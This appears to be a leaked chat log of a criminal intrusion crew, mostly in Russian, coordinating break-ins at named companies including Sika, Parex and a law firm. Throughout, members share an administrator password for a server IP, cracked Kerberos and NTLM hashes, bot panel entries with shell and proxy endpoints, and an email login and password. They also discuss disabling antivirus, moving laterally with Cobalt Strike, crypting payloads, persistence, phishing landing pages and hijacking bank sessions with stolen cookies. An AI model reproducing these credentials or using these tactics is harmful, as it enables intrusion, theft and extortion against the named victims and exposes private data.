+https://www.zoominfo.com/c/parex-usa-inc/51741477
+Website
+www.parexusa.com
+Parex USA Revenue
+
+Revenue
+$93.6M
+Industry
+
+Industry
+Chemicals, Petrochemicals, Glass & Gases
+Manufacturing
+```
+
+
+--------------------
+[2023-12-17 12:47:23] @cameron777:matrix.org: kto zdelaet?
+--------------------
+[2023-12-17 12:48:39] @cameron777:matrix.org: * nado probit' vozmozhno eti
+
+```
+https://www.zoominfo.com/c/sika-ag/34963667
+
+Website
+www.sika.com
+Sika Revenue
+
+Revenue
+$9.7B
+Stock Symbol
+
+Stock Symbol
+SIK
+Industry
+
+Industry
+Commercial & Residential Construction
+Construction
+===============================================
+https://www.zoominfo.com/c/parex-usa-inc/51741477
+Website
+www.parexusa.com
+Parex USA Revenue
+
+Revenue
+$93.6M
+Industry
+
+Industry
+Chemicals, Petrochemicals, Glass & Gases
+Manufacturing
+```
+--------------------
+[2023-12-17 12:48:47] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> 18.134.6.74
+> Administrator
+> -!lQ9&sxDlmv3x3txAo!d!P&=.ymw4qu
+>
+> ```
+> Liste des approbations de domaine :
+>     0: SIKA sika.com (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: 0x8 )
+>     1: PAREXGROUP parexgroup.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
+> La commande a été correctement exécutée
+> ```
+
+++
+--------------------
+[2023-12-17 12:49:15] @cameron777:matrix.org: mogu kerbi snyat'
+--------------------
+[2023-12-17 12:49:24] @cameron777:matrix.org: tam Windef
+--------------------
+[2023-12-17 12:49:42] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> mogu kerbi snyat'
+
+будет хорошо
+--------------------
+[2023-12-17 12:49:47] @cameron777:matrix.org: shas zaydu
+--------------------
+[2023-12-17 12:52:46] @cameron777:matrix.org: sika.com.txt
+--------------------
+[2023-12-17 12:52:54] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> sent a file.
+
+++
+--------------------
+[2023-12-17 12:53:08] @cameron777:matrix.org: mozhete zayti v rdp
+--------------------
+[2023-12-17 12:54:09] @usernamejj:matrix.bestflowers247.online: rbs.txt
+--------------------
+[2023-12-17 12:57:46] @username777:matrix.bestflowers247.online: $krb5tgs$23$*svc_jde_palettes$parexgroup.local$HTTP/fr4lx8310.parexgroup.local*$d23b905e2e0d521df3c...bcf0b9cad3:Pal.2018
+
+--------------------
+[2023-12-17 13:00:24] @cameron777:matrix.org: > <@cameron777:matrix.org> https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+>
+> Barrack Rodos & Bacine
+>
+> Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+>
+> Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+>
+> Revenue
+> $15.9M
+> Industry
+>
+> Industry
+> Law Firms & Legal Services
+>
+>
+> ```
+> Bot ID	BRBWRK1_zwashington_59C9127F
+> IP | Country	50.238.167.2 | US
+> Domain | Hosts	barrack.com
+>
+>
+> Shell 13.57.243.97:18869
+> Socks 13.57.243.97:13028
+> FTP   13.57.243.97:15597
+>
+> Antivirus Processes (2)
+> SentinelOne
+> SentinelOne Singularity XDR
+> ```
+
+etot ok citrix ne zakrilsya?
+--------------------
+[2023-12-17 13:00:48] @usernamejj:matrix.bestflowers247.online: работает
+--------------------
+[2023-12-17 13:00:52] @cameron777:matrix.org: ok
+--------------------
+[2023-12-17 13:01:02] @usernamejj:matrix.bestflowers247.online: > <@username777:matrix.bestflowers247.online> $krb5tgs$23$*svc_jde_palettes$parexgroup.local$HTTP/fr4lx8310.parexgroup.local*$d23b905e2e0d521df3c...bcf0b9cad3:Pal.2018
+
+++
+--------------------
+[2023-12-17 13:11:43] @cameron777:matrix.org: tam ya exe zapustil dll ne startavalo pochemu to
+vozmozhno windef spalit ego tak kak exe esho vsyu chistku ne zdelali
+tam nado zakrepitsya v drugix mestax esho
+
+--------------------
+[2023-12-17 13:11:56] @cameron777:matrix.org: v parex
+--------------------
+[2023-12-17 13:12:13] @usernamejj:matrix.bestflowers247.online: он у меня в кобе сейчас
+--------------------
+[2023-12-17 13:12:17] @cameron777:matrix.org: uspevaesh oba smotret'?
+--------------------
+[2023-12-17 13:12:23] @usernamejj:matrix.bestflowers247.online: стараюсь
+--------------------
+[2023-12-17 13:17:30] @ssd:matrix.bestflowers247.online: ок
+--------------------
+[2023-12-17 13:20:38] @cameron777:matrix.org: > <@usernamejj:matrix.bestflowers247.online> стараюсь
+
+esli ne supevaesh skin NN-u
+--------------------
+[2023-12-17 13:20:42] @ssd:matrix.bestflowers247.online: че там
+--------------------
+[2023-12-17 13:20:43] @cameron777:matrix.org: > <@usernamejj:matrix.bestflowers247.online> стараюсь
+
+* esli ne uspevaesh skin NN-u
+--------------------
+[2023-12-17 13:20:44] @ssd:matrix.bestflowers247.online: такое
+--------------------
+[2023-12-17 13:20:54] @usernamejj:matrix.bestflowers247.online: уже на этапе передачи
+--------------------
+[2023-12-17 13:20:59] @cameron777:matrix.org: ok
+--------------------
+[2023-12-17 13:26:59] @usernameboy:matrix.bestflowers247.online: > <@usernamess:matrix.bestflowers247.online> ```
+> 2c0b9fa97fcbc49052701933f21f4273
+> acdc79b34de42eba67185c42854d7cc1
+> 04111249b8f5545cd2696e56787d1c34
+> ```
+
+
+2c0b9fa97fcbc49052701933f21f4273:ARMSADAUTO
+
+--------------------
+[2023-12-17 13:41:10] @ssd:matrix.bestflowers247.online: хай
+--------------------
+[2023-12-17 13:41:11] @ssd:matrix.bestflowers247.online: есть кто
+--------------------
+[2023-12-17 13:45:49] @ssd:matrix.bestflowers247.online: > <@w:matrixtcFJHPDblmt2rg.network> не с дропабокса
+
+вы уже грузили и как она там
+--------------------
+[2023-12-17 14:24:22] @cameron777:matrix.org: s barrack.com chto to vishlo?
+kerbi snyal ?
+
+--------------------
+[2023-12-17 14:25:00] @usernamejj:matrix.bestflowers247.online: в кобе умирает
+--------------------
+[2023-12-17 14:25:12] @usernamejj:matrix.bestflowers247.online: либо потом вовсе не стучит
+--------------------
+[2023-12-17 14:25:22] @usernamejj:matrix.bestflowers247.online: хотя процесс запускается
+--------------------
+[2023-12-17 14:25:27] @cameron777:matrix.org: snyat' kerbi ?
+eto pomozhet?
+--------------------
+[2023-12-17 14:25:33] @usernamejj:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 14:25:36] @cameron777:matrix.org: ok sahs zaydu
+--------------------
+[2023-12-17 14:25:41] @cameron777:matrix.org: * ok shas zaydu
+--------------------
+[2023-12-17 14:29:50] @usernamenn:matrix.bestflowers247.online: 40ac4e5ef77357d2c72ce746929765d5
+--------------------
+[2023-12-17 14:30:26] @usernamenn:matrix.bestflowers247.online: 5ca7d19ec41026f98ca3fe488b6b39ee
+9bc7b0272aacf5bea77ed0ef2f53c6cb
+--------------------
+[2023-12-17 14:34:20] @usernamegg:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> сегодня еще попробую поставить BounceBack
+
+отлично
+--------------------
+[2023-12-17 14:34:46] @cob_crypt_ward:matrix.bestflowers247.online: да, вот как раз настраиваю его сейчас, правило делаю
+--------------------
+[2023-12-17 14:34:50] @usernamegg:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> кстати, хотел спросить, не вариант через smb перекидывать dll на удаленную машину, а потом через remote-exec выполнять ее?
+
+вариант конечно,главное что не палилось
+--------------------
+[2023-12-17 14:35:01] @usernamegg:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> или вам нужно все то же самое, только одной командой?
+
+лучше одной
+--------------------
+[2023-12-17 14:35:17] @cob_crypt_ward:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> вариант конечно,главное что не палилось
+
+так по-сути тот же джамп, он же тоже вроде через smb загружает билд
+--------------------
+[2023-12-17 14:35:31] @cameron777:matrix.org: http:/temp.sh/QbsPm/hh.txt
+--------------------
+[2023-12-17 14:35:39] @cameron777:matrix.org: * https:?/temp.sh/QbsPm/hh.txt
+--------------------
+[2023-12-17 14:35:45] @cameron777:matrix.org: * https://temp.sh/QbsPm/hh.txt
+--------------------
+[2023-12-17 14:35:51] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> https://temp.sh/QbsPm/hh.txt
+
+++
+--------------------
+[2023-12-17 14:35:52] @cob_crypt_ward:matrix.bestflowers247.online: а у remote-exec есть три параметра, wmi, psexec и какой-ио еще один
+--------------------
+[2023-12-17 14:36:09] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 14:37:20] @usernamejj:matrix.bestflowers247.online: rbs_barrack.txt
+--------------------
+[2023-12-17 14:37:28] @usernamegg:matrix.bestflowers247.online: ку
+--------------------
+[2023-12-17 14:37:45] @usernamegg:matrix.bestflowers247.online: надо тестировать
+--------------------
+[2023-12-17 14:37:52] @cameron777:matrix.org: ku
+--------------------
+[2023-12-17 14:37:56] @cameron777:matrix.org: pomogayu vsem kak mogu
+--------------------
+[2023-12-17 14:37:58] @cameron777:matrix.org: * pomogayu vsem kak mogu)
+--------------------
+[2023-12-17 14:38:14] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 14:39:56] @cob_crypt_ward:matrix.bestflowers247.online: а кобу кто-то по моему мануалу ставил? получалось, или ошибки возникали?
+--------------------
+[2023-12-17 14:42:17] @cameron777:matrix.org: > <@usernamejj:matrix.bestflowers247.online> ++
+
+admin est' tut
+--------------------
+[2023-12-17 14:42:43] @w:matrixtcFJHPDblmt2rg.network: да есть
+--------------------
+[2023-12-17 14:42:50] @usernamejj:matrix.bestflowers247.online: да, отдал на расшифровку
+--------------------
+[2023-12-17 14:43:31] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 14:43:33] @usernamegg:matrix.bestflowers247.online: вижу
+--------------------
+[2023-12-17 14:43:37] @usernamegg:matrix.bestflowers247.online: отлично
+--------------------
+[2023-12-17 14:44:06] @usernamegg:matrix.bestflowers247.online: посталиви все ок
+--------------------
+[2023-12-17 14:44:13] @cob_crypt_ward:matrix.bestflowers247.online: радует)
+--------------------
+[2023-12-17 14:44:16] @usernamegg:matrix.bestflowers247.online: завтра скидывать будт на крипт первые файлы
+--------------------
+[2023-12-17 14:44:24] @cob_crypt_ward:matrix.bestflowers247.online: окей, без проблем
+--------------------
+[2023-12-17 14:44:29] @usernamegg:matrix.bestflowers247.online: * завтра скидывать будут на крипт первые файлы
+--------------------
+[2023-12-17 14:44:40] @usernamegg:matrix.bestflowers247.online: сегодня всех почти отпустил
+--------------------
+[2023-12-17 14:45:06] @usernamegg:matrix.bestflowers247.online: кто то остался в офисе не захотели уезжать, погода типа не очень и завтра все ранво в 10 утра нужно быть
+--------------------
+[2023-12-17 14:45:26] @cob_crypt_ward:matrix.bestflowers247.online: а у вас офис даже?
+--------------------
+[2023-12-17 14:45:30] @cob_crypt_ward:matrix.bestflowers247.online: офигеть
+--------------------
+[2023-12-17 14:45:47] @usernamegg:matrix.bestflowers247.online: не один )
+--------------------
+[2023-12-17 14:45:53] @cob_crypt_ward:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> сегодня всех почти отпустил
+
+я посижу с blackbounce поразбираюсь, потом пойду если можно
+--------------------
+[2023-12-17 14:46:07] @cob_crypt_ward:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> не один )
+
+крутые вы ребята
+--------------------
+[2023-12-17 14:46:23] @usernamegg:matrix.bestflowers247.online: да, тебе повезло, ты попал сразу куда надо.
+--------------------
+[2023-12-17 14:46:26] @w:matrixtcFJHPDblmt2rg.network: Кароче без дропбокса тоже норм идет
+--------------------
+[2023-12-17 14:46:45] @cob_crypt_ward:matrix.bestflowers247.online: знаю что повезло, хочу остаться с вами, надеюсь у нас все ок будет
+--------------------
+[2023-12-17 14:47:23] @cob_crypt_ward:matrix.bestflowers247.online: кстати, я недоговорил, знаю еще веб пентест, на среднем уровне, в CTF участвовал, занимали места с командой
+--------------------
+[2023-12-17 14:47:28] @cob_crypt_ward:matrix.bestflowers247.online: вдруг понадобиться где-то
+--------------------
+[2023-12-17 14:47:30] @cob_crypt_ward:matrix.bestflowers247.online: но хочу от
+--------------------
+[2023-12-17 14:47:39] @cob_crypt_ward:matrix.bestflowers247.online: * но хочу от этого уйти, поскольку надоело уже сильно
+--------------------
+[2023-12-17 14:51:05] @cob_crypt_ward:matrix.bestflowers247.online: тему кстати закрыли, но на удаление фоток админ ничего не ответил, спросил у него еще раз
+--------------------
+[2023-12-17 14:51:08] @cob_crypt_ward:matrix.bestflowers247.online: пока что молчит
+--------------------
+[2023-12-17 14:52:05] @usernamegg:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> кстати, я недоговорил, знаю еще веб пентест, на среднем уровне, в CTF участвовал, занимали места с командой
+
+хорошо, я буду иметь введу
+--------------------
+[2023-12-17 14:52:30] @usernamegg:matrix.bestflowers247.online: вот как ты пришел в этому варианту сборки с кобой
+--------------------
+[2023-12-17 14:52:34] @w:matrixtcFJHPDblmt2rg.network: Привет, как тыт ам?
+--------------------
+[2023-12-17 14:52:42] @w:matrixtcFJHPDblmt2rg.network: * Привет, как ты там?
+--------------------
+[2023-12-17 14:52:43] @w:matrixtcFJHPDblmt2rg.network: Как дела?
+--------------------
+[2023-12-17 14:52:45] @usernamegg:matrix.bestflowers247.online: привет
+--------------------
+[2023-12-17 14:52:46] @cob_crypt_ward:matrix.bestflowers247.online: не понял немного вопроса
+--------------------
+[2023-12-17 14:52:46] @usernamegg:matrix.bestflowers247.online: заепался
+--------------------
+[2023-12-17 14:52:48] @usernamegg:matrix.bestflowers247.online: ну ничего
+--------------------
+[2023-12-17 14:52:50] @usernamegg:matrix.bestflowers247.online: ты как /)
+--------------------
+[2023-12-17 14:52:53] @usernamegg:matrix.bestflowers247.online: ?
+--------------------
+[2023-12-17 14:52:58] @w:matrixtcFJHPDblmt2rg.network: верю
+--------------------
+[2023-12-17 14:53:04] @w:matrixtcFJHPDblmt2rg.network: та нормально, вот делаю по пике тут
+--------------------
+[2023-12-17 14:53:14] @usernamegg:matrix.bestflowers247.online: как ты пришел к этому решению с кобой ?
+--------------------
+[2023-12-17 14:53:17] @w:matrixtcFJHPDblmt2rg.network: щас доделаю все для ограничения доступа для SSD
+--------------------
+[2023-12-17 14:53:22] @usernamegg:matrix.bestflowers247.online: ситуация какая то вынудила или что ?
+--------------------
+[2023-12-17 14:53:39] @cob_crypt_ward:matrix.bestflowers247.online: нет, я просто по жизни стараюсь чему-то новому учиться
+--------------------
+[2023-12-17 14:53:44] @w:matrixtcFJHPDblmt2rg.network: чтобы группы можно было указывать
+--------------------
+[2023-12-17 14:53:47] @cob_crypt_ward:matrix.bestflowers247.online: и в принципе, я вижу свой путь в этом
+--------------------
+[2023-12-17 14:53:52] @w:matrixtcFJHPDblmt2rg.network: еще по этим меткам можно было поиск делать
+--------------------
+[2023-12-17 14:53:58] @cob_crypt_ward:matrix.bestflowers247.online: всегда разбирался в направляниях пентеста и тд
+--------------------
+[2023-12-17 14:54:15] @w:matrixtcFJHPDblmt2rg.network: ну и стилак синхронизация и автозапуск на воркгруп ботах
+--------------------
+[2023-12-17 14:54:21] @usernamegg:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> всегда разбирался в направляниях пентеста и тд
+
+ну отлично, значит это твое.
+--------------------
+[2023-12-17 14:54:25] @w:matrixtcFJHPDblmt2rg.network: и днс, и еще надо пролить поисковик ( вайт ) для трафа
+--------------------
+[2023-12-17 14:54:28] @cob_crypt_ward:matrix.bestflowers247.online: угу
+--------------------
+[2023-12-17 14:54:31] @w:matrixtcFJHPDblmt2rg.network: кароче дела есть)
+--------------------
+[2023-12-17 14:54:33] @usernamegg:matrix.bestflowers247.online: > <@w:matrixtcFJHPDblmt2rg.network> чтобы группы можно было указывать
+
+отлично
+--------------------
+[2023-12-17 14:55:33] @w:matrixtcFJHPDblmt2rg.network: сетки все поставил, что запланировал?
+--------------------
+[2023-12-17 14:57:11] @usernameboy:matrix.bestflowers247.online: 5ca7d19ec41026f98ca3fe488b6b39ee:Helene1984.
+
+--------------------
+[2023-12-17 15:03:56] @usernamegg:matrix.bestflowers247.online: я пойду выдохну чуть
+--------------------
+[2023-12-17 15:04:06] @usernamegg:matrix.bestflowers247.online: в баню )
+--------------------
+[2023-12-17 15:04:27] @usernamegg:matrix.bestflowers247.online: посмотри тебе расшифровали
+--------------------
+[2023-12-17 15:04:46] @usernamenn:matrix.bestflowers247.online: я видел уведомление
+--------------------
+[2023-12-17 15:04:49] @usernamenn:matrix.bestflowers247.online: там не админ доменной
+--------------------
+[2023-12-17 15:04:56] @usernamenn:matrix.bestflowers247.online: я уже двинулся, но доменного пока нет
+--------------------
+[2023-12-17 15:05:15] @usernamenn:matrix.bestflowers247.online: на 10 тачек двинулся
+--------------------
+[2023-12-17 15:05:19] @usernamenn:matrix.bestflowers247.online: закрепляюсь
+--------------------
+[2023-12-17 15:21:36] @ssd:matrix.bestflowers247.online: збс
+--------------------
+[2023-12-17 15:21:45] @ssd:matrix.bestflowers247.online: должо лучше еще идти
+--------------------
+[2023-12-17 15:21:52] @ssd:matrix.bestflowers247.online: ладно в пнд го\
+--------------------
+[2023-12-17 15:21:58] @ssd:matrix.bestflowers247.online: по полной
+--------------------
+[2023-12-17 15:22:01] @ssd:matrix.bestflowers247.online: есть просьба
+--------------------
+[2023-12-17 15:22:09] @ssd:matrix.bestflowers247.online: подготовить желательно к 15
+--------------------
+[2023-12-17 15:25:31] @w:matrixtcFJHPDblmt2rg.network: адвай
+--------------------
+[2023-12-17 15:25:33] @w:matrixtcFJHPDblmt2rg.network: сдавай
+--------------------
+[2023-12-17 15:25:38] @w:matrixtcFJHPDblmt2rg.network: с легким паром
+--------------------
+[2023-12-17 15:25:43] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+>
+> Barrack Rodos & Bacine
+>
+> Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+>
+> Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+>
+> Revenue
+> $15.9M
+> Industry
+>
+> Industry
+> Law Firms & Legal Services
+>
+>
+> ```
+> Bot ID	BRBWRK1_zwashington_59C9127F
+> IP | Country	50.238.167.2 | US
+> Domain | Hosts	barrack.com
+>
+>
+> Shell 13.57.243.97:18869
+> Socks 13.57.243.97:13028
+> FTP   13.57.243.97:15597
+>
+> Antivirus Processes (2)
+> SentinelOne
+> SentinelOne Singularity XDR
+> ```
+
+citrix закрылся
+--------------------
+[2023-12-17 15:25:53] @w:matrixtcFJHPDblmt2rg.network: окей, если крипт выдадут, то все будет готово
+--------------------
+[2023-12-17 15:25:58] @w:matrixtcFJHPDblmt2rg.network: мне только крипт по сути
+--------------------
+[2023-12-17 15:26:01] @w:matrixtcFJHPDblmt2rg.network: все остальное готово
+--------------------
+[2023-12-17 15:26:51] @ssd:matrix.bestflowers247.online: ponal
+--------------------
+[2023-12-17 15:27:00] @ssd:matrix.bestflowers247.online: еще надо вырубать ленды после прогруза
+--------------------
+[2023-12-17 15:27:08] @ssd:matrix.bestflowers247.online: иначе реверся прут
+--------------------
+[2023-12-17 15:27:27] @ssd:matrix.bestflowers247.online: вроде или я ошибаюсь
+--------------------
+[2023-12-17 15:28:13] @cameron777:matrix.org: bot poka online
+--------------------
+[2023-12-17 15:28:51] @cameron777:matrix.org: no tam esli palev viydet otrubit S1
+--------------------
+[2023-12-17 15:29:40] @cameron777:matrix.org: shas sminutku
+--------------------
+[2023-12-17 15:29:41] @cameron777:matrix.org: otkroyu
+--------------------
+[2023-12-17 15:30:53] @cameron777:matrix.org: zaxodi
+--------------------
+[2023-12-17 15:33:50] @w:matrixtcFJHPDblmt2rg.network: окей
+--------------------
+[2023-12-17 15:33:56] @w:matrixtcFJHPDblmt2rg.network: щас сделаю
+--------------------
+[2023-12-17 15:34:57] @w:matrixtcFJHPDblmt2rg.network: все переключил всех на вайт
+--------------------
+[2023-12-17 15:38:11] @ssd:matrix.bestflowers247.online: ок
+--------------------
+[2023-12-17 15:54:39] @ssd:matrix.bestflowers247.online: с криптой что
+--------------------
+[2023-12-17 15:54:41] @ssd:matrix.bestflowers247.online: инжом
+--------------------
+[2023-12-17 15:54:43] @ssd:matrix.bestflowers247.online: ГГ
+--------------------
+[2023-12-17 15:54:47] @ssd:matrix.bestflowers247.online: будем запускать
+--------------------
+[2023-12-17 15:54:49] @ssd:matrix.bestflowers247.online: или как
+--------------------
+[2023-12-17 16:06:10] @w:matrixtcFJHPDblmt2rg.network: инжект EXE?
+--------------------
+[2023-12-17 16:06:13] @w:matrixtcFJHPDblmt2rg.network: или что?
+--------------------
+[2023-12-17 16:09:44] @ssd:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 16:09:45] @ssd:matrix.bestflowers247.online: ехе
+--------------------
+[2023-12-17 16:12:14] @w:matrixtcFJHPDblmt2rg.network: сколько весит?
+--------------------
+[2023-12-17 16:12:19] @w:matrixtcFJHPDblmt2rg.network: скинь его
+--------------------
+[2023-12-17 16:18:22] @w:matrixtcFJHPDblmt2rg.network: я если что сегодня заливать не буду эти фиксы, я лучше с утра залью, чтобы на ночь ничего не сломать)\
+--------------------
+[2023-12-17 16:26:20] @ssd:matrix.bestflowers247.online: я скидывал гг
+--------------------
+[2023-12-17 16:26:34] @ssd:matrix.bestflowers247.online: ладно позже тест сделаю крипта
+--------------------
+[2023-12-17 16:43:06] @ssd:matrix.bestflowers247.online: у вас авторун
+--------------------
+[2023-12-17 16:43:09] @ssd:matrix.bestflowers247.online: работает
+--------------------
+[2023-12-17 16:43:34] @ssd:matrix.bestflowers247.online: Мне бы линки под ленды новые че нибудь посоветуй
+--------------------
+[2023-12-17 16:43:57] @w:matrixtcFJHPDblmt2rg.network: > <@ssd:matrix.bestflowers247.online> у вас авторун
+
+авторан в каком плане?
+--------------------
+[2023-12-17 16:44:08] @w:matrixtcFJHPDblmt2rg.network: типо добавлять ваш файл на машину в авторан?
+--------------------
+[2023-12-17 16:44:21] @ssd:matrix.bestflowers247.online: ну смотри после того как бот в сеть выходит
+--------------------
+[2023-12-17 16:44:27] @ssd:matrix.bestflowers247.online: инжект опять работает
+--------------------
+[2023-12-17 16:44:29] @ssd:matrix.bestflowers247.online: или как
+--------------------
+[2023-12-17 16:44:44] @w:matrixtcFJHPDblmt2rg.network: ну у нас бот работает
+--------------------
+[2023-12-17 16:44:46] @w:matrixtcFJHPDblmt2rg.network: инжект нет
+--------------------
+[2023-12-17 16:44:52] @w:matrixtcFJHPDblmt2rg.network: я его вообще в процесс инжектирую
+--------------------
+[2023-12-17 16:44:59] @w:matrixtcFJHPDblmt2rg.network: он на тачке даже не храниться
+--------------------
+[2023-12-17 16:45:03] @ssd:matrix.bestflowers247.online: инжект
+--------------------
+[2023-12-17 16:45:04] @ssd:matrix.bestflowers247.online: мой
+--------------------
+[2023-12-17 16:45:06] @ssd:matrix.bestflowers247.online: ?
+--------------------
+[2023-12-17 16:45:23] @ssd:matrix.bestflowers247.online: тоесть будет работать инжект
+--------------------
+[2023-12-17 16:45:23] @w:matrixtcFJHPDblmt2rg.network: оцессмой бот твой инжект закидывает в другой пр
+--------------------
+[2023-12-17 16:45:27] @ssd:matrix.bestflowers247.online: когда тока тачка в сети
+--------------------
+[2023-12-17 16:45:33] @w:matrixtcFJHPDblmt2rg.network: да
+--------------------
+[2023-12-17 16:45:54] @w:matrixtcFJHPDblmt2rg.network: твой инжект будет рабоать когда мы его запустим на тачке до перезапуска
+--------------------
+[2023-12-17 16:46:12] @w:matrixtcFJHPDblmt2rg.network: и надо проверить твой инжект, совместим ли он с инжектом в процесс вообще
+--------------------
+[2023-12-17 16:46:25] @w:matrixtcFJHPDblmt2rg.network: на чем написан этот crypto inject?
+--------------------
+[2023-12-17 16:49:09] @ssd:matrix.bestflowers247.online: нэйтив c++
+--------------------
+[2023-12-17 16:49:23] @ssd:matrix.bestflowers247.online: инжект в процесс должен работать
+--------------------
+[2023-12-17 16:51:16] @ssd:matrix.bestflowers247.online: [19:51:16] uTox User: а тогда хз пройдет ли его инжект в процесс
+[19:51:19] dss:  почему
+[19:51:27] uTox User: это все зависит от крипта того чела
+--------------------
+[2023-12-17 16:51:24] @ssd:matrix.bestflowers247.online: кодер крипто софта говорит
+--------------------
+[2023-12-17 16:54:19] @w:matrixtcFJHPDblmt2rg.network: от крипта?
+--------------------
+[2023-12-17 16:54:31] @w:matrixtcFJHPDblmt2rg.network: крипта какого чела?
+--------------------
+[2023-12-17 17:01:52] @ssd:matrix.bestflowers247.online: да хз дали кого то
+--------------------
+[2023-12-17 17:02:00] @ssd:matrix.bestflowers247.online: делает крипт с автозагрузкой
+--------------------
+[2023-12-17 17:02:06] @ssd:matrix.bestflowers247.online: может и ваш делать чел
+--------------------
+[2023-12-17 17:02:17] @ssd:matrix.bestflowers247.online: нужна автозагрузка
+--------------------
+[2023-12-17 17:04:11] @ssd:matrix.bestflowers247.online: https://openai.com/
+--------------------
+[2023-12-17 17:04:15] @w:matrixtcFJHPDblmt2rg.network: ага, ну вот хер его теперь, ибо автозагрузка этого криптера может сломаться
+--------------------
+[2023-12-17 17:04:18] @ssd:matrix.bestflowers247.online: у вас кто то грузит вам этот ленд
+--------------------
+[2023-12-17 17:04:19] @ssd:matrix.bestflowers247.online: или могу тоже
+--------------------
+[2023-12-17 17:04:29] @w:matrixtcFJHPDblmt2rg.network: > <@ssd:matrix.bestflowers247.online> у вас кто то грузит вам этот ленд
+
+никто
+--------------------
+[2023-12-17 17:04:44] @w:matrixtcFJHPDblmt2rg.network: сколько весит билд инжекта этого без крипта?
+--------------------
+[2023-12-17 17:05:12] @ssd:matrix.bestflowers247.online: завтра скажу
+--------------------
+[2023-12-17 17:05:15] @ssd:matrix.bestflowers247.online: дохера весит
+--------------------
+[2023-12-17 17:05:18] @ssd:matrix.bestflowers247.online: вроде бы
+--------------------
+[2023-12-17 17:05:35] @w:matrixtcFJHPDblmt2rg.network: +++
+--------------------
+[2023-12-17 17:05:36] @w:matrixtcFJHPDblmt2rg.network: окей
+--------------------
+[2023-12-17 17:07:08] @ssd:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent an image.
+
+что это
+--------------------
+[2023-12-17 17:09:33] @ssd:matrix.bestflowers247.online: ГГ хоть одна сетка в работу пошла с 200 ботов
+--------------------
+[2023-12-17 17:09:35] @ssd:matrix.bestflowers247.online: или шлак все
+--------------------
+[2023-12-17 17:09:47] @ssd:matrix.bestflowers247.online: ну щас погрузим неделю другую
+--------------------
+[2023-12-17 17:09:50] @ssd:matrix.bestflowers247.online: видно будет
+--------------------
+[2023-12-17 17:09:56] @ssd:matrix.bestflowers247.online: что то менять придется ленды или хз
+--------------------
+[2023-12-17 17:10:02] @ssd:matrix.bestflowers247.online: но слак тимка анидеск
+--------------------
+[2023-12-17 17:10:05] @ssd:matrix.bestflowers247.online: корп ленды
+--------------------
+[2023-12-17 17:16:18] @usernamegg:matrix.bestflowers247.online: Goods_5k.txt_17.12.2023.txt
+--------------------
+[2023-12-17 17:16:24] @usernamegg:matrix.bestflowers247.online: почему то по ней очень низкий валид
+--------------------
+[2023-12-17 17:16:27] @usernamegg:matrix.bestflowers247.online: дай отчет по доменам
+--------------------
+[2023-12-17 17:16:31] @usernamegg:matrix.bestflowers247.online: Total: 4,727
+Checked: 4,727
+Valid: 11
+Dubls in file: 0
+Imported: 4
+report
+--------------------
+[2023-12-17 17:19:46] @usernamegg:matrix.bestflowers247.online: банк акки его
+--------------------
+[2023-12-17 17:19:52] @usernamegg:matrix.bestflowers247.online: мы все выдергивает
+--------------------
+[2023-12-17 17:19:58] @usernamegg:matrix.bestflowers247.online: куки натягивай его и заходи
+--------------------
+[2023-12-17 17:25:42] @usernamegg:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-12-17 17:25:53] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2023-12-17 17:25:59] @usernamegg:matrix.bestflowers247.online: всех отпустил
+--------------------
+[2023-12-17 17:26:07] @usernamegg:matrix.bestflowers247.online: $$ тоже сегодня приедет к тебе
+--------------------
+[2023-12-17 17:26:24] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 17:26:28] @usernamegg:matrix.bestflowers247.online: уже поставили что то
+--------------------
+[2023-12-17 17:26:31] @usernamegg:matrix.bestflowers247.online: я все расгаривал
+--------------------
+[2023-12-17 17:30:12] @usernamegg:matrix.bestflowers247.online: потрому что там фуулл формат как ты заказывал
+--------------------
+[2023-12-17 17:30:24] @usernamegg:matrix.bestflowers247.online: doublejgraphics.mail@charter.net:All4the$#:imap.charter.net:143:0
+--------------------
+[2023-12-17 17:34:25] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> всех отпустил
+
+Ок
+--------------------
+[2023-12-17 17:45:41] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2023-12-17 в 20.45.31.png
+--------------------
+[2023-12-17 17:46:09] @usernamegg:matrix.bestflowers247.online: отказался от гаранта ) чувак написал арбитраж и нас забанили, ну не бред ?
+--------------------
+[2023-12-17 17:47:26] @usernamenn:matrix.bestflowers247.online: пиздец бред бля
+--------------------
+[2023-12-17 17:48:11] @usernamegg:matrix.bestflowers247.online: там все вахуя ))
